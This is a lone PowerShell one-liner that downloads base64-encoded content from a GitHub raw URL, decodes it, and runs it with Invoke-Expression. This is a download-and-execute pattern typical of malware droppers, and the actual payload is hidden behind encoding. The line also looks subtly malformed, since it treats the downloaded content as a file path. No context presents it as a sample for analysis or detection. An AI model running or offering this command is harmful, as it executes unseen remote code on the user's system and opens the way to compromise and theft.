iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String([System.Text.Encoding]::UTF8.GetString([System.IO.File]::ReadAllBytes((irm "https://github.com/leetcodeuser123/temp/raw/main/b64").FullName)))))
